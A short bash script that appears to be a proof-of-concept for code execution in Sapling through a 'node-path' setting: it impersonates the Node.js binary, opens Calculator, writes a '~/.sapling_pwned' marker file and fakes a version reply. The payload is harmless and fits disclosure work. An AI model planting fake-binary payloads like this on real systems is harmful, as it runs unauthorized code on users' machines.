#!/bin/bash
# 1. The visible proof
open -a Calculator
echo "RCE via node-path confirmed at $(date)" > ~/.sapling_pwned

# 2. Mimic Node.js so Sapling doesn't immediately error out
if [[ "$*" == *"--version"* ]]; then
    echo "v25.6.1"
    exit 0
fi

# 3. Handle the actual execution call
echo "Starting fake node..."
# Keep the process alive for a second so the OS has time to 'open' the app
sleep 2